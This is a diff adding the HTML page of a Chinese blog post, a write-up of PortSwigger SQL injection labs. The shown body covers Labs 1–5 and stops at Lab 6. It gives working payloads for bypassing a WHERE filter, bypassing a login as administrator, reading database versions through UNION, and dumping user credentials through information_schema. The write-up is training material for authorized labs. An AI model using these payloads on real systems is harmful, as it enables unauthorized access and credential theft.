@@ -1,0 +1,913 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 8.1.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha256-5eIC48iZUHmSlSUz9XtjRyK2mzQkHScZY1WdMaoz74E=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"www.hanlior.top","root":"/","images":"/images","scheme":"Pisces","darkmode":true,"version":"8.21.1","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":true,"style":"mac"},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="本文记录 PortSwigger Web Security Academy SQL 注入实验的解题过程，涵盖联合查询、数据库信息枚举、盲注、时间延迟、带外交互与 XML 编码过滤绕过。练习内容仅用于 PortSwigger 官方靶场或其他明确授权的环境。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PortSwigger 靶场实践：SQL 注入">
+<meta property="og:url" content="https://www.hanlior.top/2026/11/04/portswigger-sql-injection-labs/index.html">
+<meta property="og:site_name" content="HanLior">
+<meta property="og:description" content="本文记录 PortSwigger Web Security Academy SQL 注入实验的解题过程，涵盖联合查询、数据库信息枚举、盲注、时间延迟、带外交互与 XML 编码过滤绕过。练习内容仅用于 PortSwigger 官方靶场或其他明确授权的环境。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261103215059216.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261103215138494.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261103220005100.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261103221716643.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104132243011.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104132616451.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104132806144.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104133827462.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104133916350.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104140101560.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104141421828.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104141650307.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104142803785.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104150118244.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104150237816.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104145347795.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104153813375.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104153958057.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104154433663.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104191129418.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104191214930.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104191255925.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104191630478.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104192457058.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104192706712.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104192830653.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104192925654.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104193017667.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104193417461.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104203726079.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104204137504.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104204423204.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104204615336.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104204822077.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104205831788.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104205853788.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104205927730.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104210122116.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104210842442.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104211522173.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104211043787.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104211425453.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104211653153.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104212407646.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104222330721.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104224743526.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104224912722.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104225030894.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104225101716.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104225144952.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104224637017.png">
+<meta property="article:published_time" content="2026-11-04T14:55:00.000Z">
+<meta property="article:modified_time" content="2026-11-04T14:53:30.776Z">
+<meta property="article:author" content="HanLior">
+<meta property="article:tag" content="PortSwigger">
+<meta property="article:tag" content="SQL注入">
+<meta property="article:tag" content="Web安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261103215059216.png">
+
+
+<link rel="canonical" href="https://www.hanlior.top/2026/11/04/portswigger-sql-injection-labs/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://www.hanlior.top/2026/11/04/portswigger-sql-injection-labs/","path":"2026/11/04/portswigger-sql-injection-labs/","title":"PortSwigger 靶场实践：SQL 注入"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>PortSwigger 靶场实践：SQL 注入 | HanLior</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="HanLior" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">HanLior</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">技术学习与实践</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="home fa-fw"></i>首页</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="th fa-fw"></i>分类</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="user fa-fw"></i>关于</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Lab1-SQL-injection-vulnerability-in-WHERE-clause-allowing-retrieval-of-hidden-data"><span class="nav-text">Lab1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Lab2-SQL-injection-vulnerability-allowing-login-bypass"><span class="nav-text">Lab2: SQL injection vulnerability allowing login bypass</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Lab3-SQL-injection-attack-querying-the-database-type-and-version-on-Oracle"><span class="nav-text">Lab3: SQL injection attack, querying the database type and version on Oracle</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Lab4-SQL-injection-attack-querying-the-database-type-and-version-on-MySQL-and-Microsoft"><span class="nav-text">Lab4: SQL injection attack, querying the database type and version on MySQL and Microsoft</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Lab5-SQL-injection-attack-listing-the-database-contents-on-non-Oracle-databases"><span class="nav-text">Lab5: SQL injection attack, listing the database contents on non-Oracle databases</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Lab6-SQL-injection-attack-listing-the-database-contents-on-Oracle"><span class="nav-text">Lab6: SQL injection attack, listing the database contents on Oracle</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Lab7-SQL-injection-UNION-attack-determining-the-number-of-columns-returned-by-the-query"><span class="nav-text">Lab7: SQL injection UNION attack, determining the number of columns returned by the query</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Lab8-SQL-injection-UNION-attack-finding-a-column-containing-text"><span class="nav-text">Lab8: SQL injection UNION attack, finding a column containing text</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Lab9-SQL-injection-UNION-attack-retrieving-data-from-other-tables"><span class="nav-text">Lab9: SQL injection UNION attack, retrieving data from other tables</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Lab10-SQL-injection-UNION-attack-retrieving-multiple-values-in-a-single-column"><span class="nav-text">Lab10: SQL injection UNION attack, retrieving multiple values in a single column</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Lab11-Blind-SQL-injection-with-conditional-responses"><span class="nav-text">Lab11: Blind SQL injection with conditional responses</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Lab12-Blind-SQL-injection-with-conditional-errors"><span class="nav-text">Lab12: Blind SQL injection with conditional errors</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Lab13-Visible-error-based-SQL-injection"><span class="nav-text">Lab13: Visible error-based SQL injection</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Lab14-Blind-SQL-injection-with-time-delays"><span class="nav-text">Lab14: Blind SQL injection with time delays</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Lab15-Blind-SQL-injection-with-time-delays-and-information-retrieval"><span class="nav-text">Lab15: Blind SQL injection with time delays and information retrieval</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Lab16-Blind-SQL-injection-with-out-of-band-interaction"><span class="nav-text">Lab16: Blind SQL injection with out-of-band interaction</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Lab17-Blind-SQL-injection-with-out-of-band-data-exfiltration"><span class="nav-text">Lab17: Blind SQL injection with out-of-band data exfiltration</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Lab18-SQL-injection-with-filter-bypass-via-XML-encoding"><span class="nav-text">Lab18: SQL injection with filter bypass via XML encoding</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-text">总结</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">HanLior</p>
+  <div class="site-description" itemprop="description">HanLior 的个人博客，记录技术学习、项目实践与思考。</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">8</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/HanLior" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;HanLior" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://www.hanlior.top/2026/11/04/portswigger-sql-injection-labs/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="HanLior">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="HanLior">
+      <meta itemprop="description" content="HanLior 的个人博客，记录技术学习、项目实践与思考。">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="PortSwigger 靶场实践：SQL 注入 | HanLior">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          PortSwigger 靶场实践：SQL 注入
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-11-04 22:55:00" itemprop="dateCreated datePublished" datetime="2026-11-04T22:55:00+08:00">2026-11-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">web安全学习</span></a>
+        </span>
+    </span>
+
+  
+<span class="post-meta-item">
+  <span class="post-meta-item-icon">
+    <i class="far fa-calendar-check"></i>
+  </span>
+  <span class="post-meta-item-text">更新于</span>
+  <time itemprop="dateModified" datetime="2026-11-04T22:53:30+08:00">2026-11-04 22:53:30</time>
+</span>
+
+
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>3.8k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>14 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>本文记录 PortSwigger Web Security Academy SQL 注入实验的解题过程，涵盖联合查询、数据库信息枚举、盲注、时间延迟、带外交互与 XML 编码过滤绕过。练习内容仅用于 PortSwigger 官方靶场或其他明确授权的环境。</p>
+<span id="more"></span>
+
+<h1 id="Lab1-SQL-injection-vulnerability-in-WHERE-clause-allowing-retrieval-of-hidden-data"><a href="#Lab1-SQL-injection-vulnerability-in-WHERE-clause-allowing-retrieval-of-hidden-data" class="headerlink" title="Lab1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data"></a>Lab1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</h1><p>提示语句<code>SELECT * FROM products WHERE category = &#39;Gifts&#39; AND released = 1</code></p>
+<p>在检索类别的时候，还有一个附加条件就是<code>released = 1</code></p>
+<p>那么我们先查一下<code>category</code></p>
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261103215059216.png" alt="image-20261103215059216"></p>
+<p>类别是字符类型的，那么先测试一个单引号,有报错</p>
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261103215138494.png" alt="image-20261103215138494"></p>
+<p>构造一下payload</p>
+<p><code>?category=Gifts&#39; or 1=1 --+</code></p>
+<p>这样和原本的查询语句拼接完之后是这样的</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> products <span class="keyword">WHERE</span> category <span class="operator">=</span> <span class="string">&#x27;Gifts&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="comment">--&#x27; AND released = 1</span></span><br></pre></td></tr></table></figure>
+
+<p>完整过程可以看成：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">原模板：  category = &#x27; [输入] &#x27; AND released = 1</span><br><span class="line">输入：              Gifts&#x27; or 1=1 -- </span><br><span class="line">结果：    category = &#x27;Gifts&#x27; or 1=1 -- &#x27; AND released = 1</span><br></pre></td></tr></table></figure>
+
+<p>–后面的就被注视掉了，所以就把已发布和未发布的商品全都查询出来了</p>
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261103220005100.png" alt="image-20261103220005100"></p>
+<h1 id="Lab2-SQL-injection-vulnerability-allowing-login-bypass"><a href="#Lab2-SQL-injection-vulnerability-allowing-login-bypass" class="headerlink" title="Lab2: SQL injection vulnerability allowing login bypass"></a>Lab2: SQL injection vulnerability allowing login bypass</h1><p>题目意思是说让在登陆框这里sql注入，使用<code>administrator</code>登陆</p>
+<p>尝试一下用户名为<code>administrator</code> 密码也是，无法登陆</p>
+<p>然后测试一下<code>administrator&#39;</code> 发现有报错提示，那么就有可能有sql注入</p>
+<p>可以猜想一下这里的sql查询是什么样子的</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;administrator&#x27;</span> <span class="keyword">and</span> password <span class="operator">=</span> <span class="string">&#x27;1234123&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>那么我们直接在username里面测试<code>administrator&#39;--</code></p>
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261103221716643.png" alt="image-20261103221716643"></p>
+<p>这样构造出来的sql也就是</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;administrator&#x27;</span> <span class="comment">--&#x27; and password = &#x27;1234123&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>依旧是–后面的全部都注释掉了，直接实现登陆</p>
+<h1 id="Lab3-SQL-injection-attack-querying-the-database-type-and-version-on-Oracle"><a href="#Lab3-SQL-injection-attack-querying-the-database-type-and-version-on-Oracle" class="headerlink" title="Lab3: SQL injection attack, querying the database type and version on Oracle"></a>Lab3: SQL injection attack, querying the database type and version on Oracle</h1><p><strong>Oracle</strong>数据库的SQL注入</p>
+<p>这里先学习一下<strong>Oracle</strong>和<strong>Mysql</strong>的区别</p>
+<table>
+<thead>
+<tr>
+<th>目的</th>
+<th>MySQL</th>
+<th>Oracle</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>闭合字符串</td>
+<td><code>&#39;</code></td>
+<td><code>&#39;</code></td>
+</tr>
+<tr>
+<td>修改条件</td>
+<td><code>OR 1=1</code></td>
+<td><code>OR 1=1</code></td>
+</tr>
+<tr>
+<td>统计列数</td>
+<td><code>ORDER BY 1</code>、<code>ORDER BY 2</code></td>
+<td>基本一样</td>
+</tr>
+<tr>
+<td>联合查询</td>
+<td><code>UNION SELECT</code></td>
+<td><code>UNION SELECT</code></td>
+</tr>
+<tr>
+<td>查询版本</td>
+<td><code>@@version</code> 或 <code>version()</code></td>
+<td><code>BANNER FROM v$version</code></td>
+</tr>
+<tr>
+<td>查看表</td>
+<td><code>information_schema.tables</code></td>
+<td><code>user_tables</code>、<code>all_tables</code></td>
+</tr>
+<tr>
+<td>字符串拼接</td>
+<td><code>CONCAT(a,b)</code></td>
+<td>&#96;a</td>
+</tr>
+<tr>
+<td>注释</td>
+<td><code>-- </code>、<code>#</code>、<code>/*...*/</code></td>
+<td><code>--</code>、<code>/*...*/</code>，一般没有 MySQL 的 <code>#</code></td>
+</tr>
+<tr>
+<td>无表查询常量</td>
+<td><code>SELECT &#39;test&#39;</code></td>
+<td>常见写法是 <code>SELECT &#39;test&#39; FROM dual</code></td>
+</tr>
+</tbody></table>
+<p>这个题是让我们显示出来数据库的版本信息，那就是拼接一下数据库的特有语法<code>union select BANNER from v$version</code></p>
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104132243011.png" alt="image-20261104132243011"></p>
+<p>具体来看一下实现</p>
+<p>要想使用<code>union</code>拼接，肯定要知道查询一下类别会出来几列的数据</p>
+<p><code>order by 3--</code>报错，那么应该是有两列</p>
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104132616451.png" alt="image-20261104132616451"></p>
+<p>直接拼接一下payload</p>
+<p><code>?category=Gifts&#39;+union+select+BANNER,NULL+from+v$version--</code>就解决了</p>
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104132806144.png" alt="image-20261104132806144"></p>
+<h1 id="Lab4-SQL-injection-attack-querying-the-database-type-and-version-on-MySQL-and-Microsoft"><a href="#Lab4-SQL-injection-attack-querying-the-database-type-and-version-on-MySQL-and-Microsoft" class="headerlink" title="Lab4: SQL injection attack, querying the database type and version on MySQL and Microsoft"></a>Lab4: SQL injection attack, querying the database type and version on MySQL and Microsoft</h1><p>查询mysql数据库的版本</p>
+<p>直接拼接一下payload来看一下，盲猜还是两列</p>
+<p><code>?category=Gifts&#39; union select @@version,NULL--</code>但是不知道为什么出现了报错 <img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104133827462.png" alt="image-20261104133827462"></p>
+<p>在<code>--</code>后面加上了一个<code>%20</code>也出了结果</p>
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104133916350.png" alt="image-20261104133916350"></p>
+<p>或者直接把<code>--</code>换成<code>%23</code> 也就是<code>#</code>经过url编码之后的也是可以出的，这里后知后觉想起来，最后没加<code>+</code> </p>
+<p><code>+</code> 也会被解析成空格的意思，有点痴呆了</p>
+<h1 id="Lab5-SQL-injection-attack-listing-the-database-contents-on-non-Oracle-databases"><a href="#Lab5-SQL-injection-attack-listing-the-database-contents-on-non-Oracle-databases" class="headerlink" title="Lab5: SQL injection attack, listing the database contents on non-Oracle databases"></a>Lab5: SQL injection attack, listing the database contents on non-Oracle databases</h1><p>直接查到数据库里面存放有用户账号密码的表，直接用查到的账户密码登陆administrator</p>
+<p>依旧还是猜两列，union拼接查询</p>
+<p><code>?category=Accessories%27union%20select%20table_name,NULL%20from%20information_schema.tables--+</code></p>
+<p>找到了一个名字为<code>users_gwzllf</code>的一个表，可能是存放着user信息的</p>
+<p>按“表名 → 列名 → 数据”的顺序查</p>
+<p><code>?category=Accessories%27%20UNION%20SELECT%20column_name%2CNULL%20FROM%20information_schema.columns%20WHERE%20table_name=%27users_gwzllf%27--+</code></p>
+<p>然后查到了列名字<code>username_lndcsp</code> <code>password_vhpwtr</code></p>
+<p><code>?category=Accessories%27%20UNION%20SELECT%20username_lndcsp%2Cpassword_vhpwtr%20FROM%20users_gwzllf--+</code></p>
+<p>然后直接从表中查数据，查到数据直接登陆即可</p>
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104140101560.png" alt="image-20261104140101560"></p>
+<h1 id="Lab6-SQL-injection-attack-listing-the-database-contents-on-Oracle"><a href="#Lab6-SQL-injection-attack-listing-the-database-contents-on-Oracle" class="headerlink" title="Lab6: SQL injection attack, listing the database contents on Oracle"></a>Lab6: SQL injection attack, listing the database contents on Oracle</h1><p>这里先具体来学习一下<strong>Oracle</strong>数据库的一些具体操作</p>
